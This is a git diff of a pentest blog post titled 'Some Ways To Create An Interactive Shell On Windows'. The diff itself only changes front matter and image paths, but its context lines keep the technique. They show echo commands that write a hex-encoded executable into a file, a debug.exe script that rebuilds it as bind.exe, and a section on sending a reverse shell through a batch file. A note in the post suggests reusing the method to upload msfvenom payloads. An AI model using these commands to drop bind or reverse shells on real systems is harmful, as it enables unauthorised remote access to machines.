@@ -4,10 +4,7 @@ title:      "Some Ways To Create An Interactive Shell On Windows"
 subtitle:   "A little record|Continuously updated"
 date:       2017-05-27
 author:     "Urahara"
-header-img: "img/d4d5dfc09f330ce82b09b792d4281f42.jpg"
-header-mask: 0.3
-tags:
-    - 渗透测试
+categories: [Pentest, Red Team]
 
 
 ---
@@ -35,7 +32,7 @@ echo e 0480 >>123.hex && echo 04 de 55 01 3c d4 14 d4 0e 1b 33 c0 4e ec 87 0b 70
 echo e 0500 >>123.hex && echo 9f c3 63 6b 65 74 bf 06 ff 03 e1 b1 91 1a 72 6e cd 6c 58 4a 47 c3 36 43 6f 6d 8b 61 37 5a 4c 62 cc 4c 80 fc 72 ed f7 3b a8 50 6f 6c ce 73 3b 21 00 00 00 00 00 00 81 3f 40 00 4c 6f 61 64 4c 69 62 72 61 72 79 41 00 47 65 74 50 72 6f 63 41 64 64 72 65 73 73 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0c 40 00 00 e9 ec be ff ff 00 00 00 02 00 00 00 0c 40 00 00  >>123.hex
 ```
 
-![win reverse](http://reverse-tcp.xyz/img/win reverse/echo.png)
+![win reverse](http://reverse-tcp.xyz/static/img/_posts/win reverse/echo.png)
 
 还原文件
 
@@ -43,13 +40,13 @@ echo e 0500 >>123.hex && echo 9f c3 63 6b 65 74 bf 06 ff 03 e1 b1 91 1a 72 6e cd
 echo r cx >>123.hex && echo 0477 >>123.hex && echo w >>123.hex && echo q >>123.hex && debug<123.hex && copy 1.dll bind.exe
 ```
 
-![win reverse](http://reverse-tcp.xyz/img/win reverse/bind.png)
+![win reverse](http://reverse-tcp.xyz/static/img/_posts/win reverse/bind.png)
 
 指定端口进行监听，建立连接
 
-![win reverse](http://reverse-tcp.xyz/img/win reverse/2333.png)
+![win reverse](http://reverse-tcp.xyz/static/img/_posts/win reverse/2333.png)
 
-![win reverse](http://reverse-tcp.xyz/img/win reverse/shell.png)
+![win reverse](http://reverse-tcp.xyz/static/img/_posts/win reverse/shell.png)
 
 ### Sending a reverse shell using a batch file
 
@@ -72,13 +69,13 @@ echo r cx >>1234.hex && echo 04ef >>1234.hex && echo w >>1234.hex && echo q >>12
 
 指定监听地址和端口并反弹
 
-![win reverse](http://reverse-tcp.xyz/img/win reverse/reverse.png)
+![win reverse](http://reverse-tcp.xyz/static/img/_posts/win reverse/reverse.png)
 
 > 当然你不必只用这个程序，这里介绍的只是一种方法，你可以用这种方法去上传用msfvenom生成的payload利用，甚至是你自己写的程序，更甚至是其他的攻击场景。。
 
 使用OD简单看一下reverse.exe调用ws2_32.dll进行处理
 
-![win reverse](http://reverse-tcp.xyz/img/win reverse/ws2_32.png)
+![win reverse](http://reverse-tcp.xyz/static/img/_posts/win reverse/ws2_32.png)
 
 
 
